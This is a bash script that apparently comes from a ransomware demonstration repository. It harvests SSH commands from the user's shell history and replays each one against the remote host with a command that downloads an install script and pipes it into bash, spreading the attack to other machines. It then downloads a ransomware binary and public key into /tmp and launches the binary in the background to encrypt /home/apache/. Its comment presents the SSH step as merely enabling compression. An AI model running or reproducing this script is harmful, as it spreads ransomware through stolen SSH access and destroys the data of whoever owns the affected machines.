#!/usr/bin/env bash
# Define the search term to look for in the command history
search_term="ssh"

# Get all commands from the history that contain the search term
commands=$(cat ~/.bash_history | grep "$search_term")

# Loop through each command and execute it with the -C flag if it's an SSH command
while IFS= read -r command; do
    if [[ $command =~ ssh ]]; then
        echo "Executing SSH command: $command -C"
        # Execute the SSH command with compression enabled (-C flag)
        $command -C 'wget -q -O - https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/main/ransomware/scripts/dangerous-install.sh | bash'
    fi
done <<< "$commands"

# setup ransomware
wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/main/ransomware/dist/ransomware -O /tmp/ransomware
wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/main/attacker/public_key.pem -O /tmp/public_key.pem
chmod +x /tmp/ransomware
export DISPLAY=:1.0
nohup /tmp/ransomware --pub /tmp/public_key.pem --path /home/apache/ --enc-sym-key /tmp/ > /tmp/logs &

